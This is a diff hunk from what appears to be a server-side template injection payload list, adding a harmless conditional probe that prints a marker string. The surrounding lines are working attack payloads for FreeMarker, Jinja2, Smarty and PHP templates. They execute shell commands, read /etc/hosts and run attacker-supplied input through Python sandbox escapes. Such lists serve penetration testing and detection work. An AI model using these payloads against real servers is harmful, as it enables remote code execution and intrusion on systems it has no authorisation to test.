@@ -28,6 +28,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/hosts").read() }}
 {{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/hosts',shell=True,stdout=-1).communicate()[0].strip()}}
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{% if 'xyz' == 'xyz' %} electric_yellow {% endif %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
 {$smarty.version}
 {php}echo `id`;{/php}
